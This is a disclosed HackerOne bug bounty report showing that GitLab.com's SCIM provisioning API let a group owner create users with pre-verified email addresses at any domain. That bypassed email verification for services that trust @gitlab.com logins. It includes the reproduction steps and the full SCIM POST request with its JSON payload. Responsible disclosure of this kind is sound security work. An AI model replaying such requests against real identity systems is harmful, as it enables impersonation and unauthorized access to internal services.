# Bypass Email Verification -- Able to Access Internal Gitlab Services that use Login with Gitlab and Perform Check on email domain

## Report Details
- **Report ID**: 565883
- **URL**: https://hackerone.com/reports/565883
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-05-04T05:48:45.353Z
- **Disclosed**: 2019-08-30T22:54:54.002Z

## Reporter
- **Username**: ngalog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
Hi, I found the new SCIM provisioning function allows any group owner in gitlab to create any user with verified email address. i.e. I can create user with email address ngalog@gitlab.com, and gitlab.com will think ngalog@gitlab.com is verified already.

This will bring problem to the client app that uses Gitlab as Identity Provider, and check if the user's email domain matches `@gitlab.com`, then using this email verification bypass, we can access the service now.

I used to have a list of internal services/sites of gitlab uses gitlab.com to sign in and check if the signed in user has @gitlab.com as their email domain. But I can't find them any more, I am sure gitlab security team know what are those services. And exposure of those services would bring a high security impact to gitlab infrastructure.

### Steps to reproduce
- In gitlab.com, upgrade your Group plan to gold
- Visit `https://gitlab.com/groups/GROUP_PATH/-/saml` and setup the SAML SSO as documented
- Same page, create SCIM token
- Use the same SCIM token to issue the request below

```
POST /api/scim/v2/groups/YOUR_GROUP_NAME/Users HTTP/1.1
Host: gitlab.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/scim+json
Authorization: Bearer YOUR_SCIM_TOKEN
Content-Length: 291

{"externalId":"REPLACE_ME","active":null,"userName":"anyusernamewilldo","emails":[{"primary":true,"type":"work","value":"ANYGITLABEMAIL@gitlab.com"}],"name":{"formatted":"Test User","familyName":"User","givenName":"Test3"},"schemas":["urn:ietf:params:scim:schemas:core:2.0:User"],"meta":{"resourceType":"User"}}
```

- And open a new private window and use https://gitlab.com/groups/GROUP_NAME/-/saml/sso?token=xqz82m-b to login using the externalId specified in the POST JSON body
- Now you are logged in as the newly created user and bypassed the email verification process



### Impact

I used to have a list of internal services/sites of gitlab uses gitlab.com to sign in and check if the signed in user has @gitlab.com as their email domain. But I can't find them any more, I am sure gitlab security team know what are those services. And exposure of those services would bring a high security impact to gitlab infrastructure.

### Examples

Check the user username4 on gitlab.com, you will see his email address is ngalog@gitlab.com and verified.

### What is the current *bug* behavior?

Email is verified without going through the verification process

### What is the expected *correct* behavior?

Email should not be verified using this method

### Relevant logs and/or screenshots

{F484033}

This bug happens on GitLab.com

#### Results of GitLab environment info

This bug happens on GitLab.com)

## Impact

see above

## Attachments
- Screen_Shot_2019-05-04_at_5.47.01_PM.png
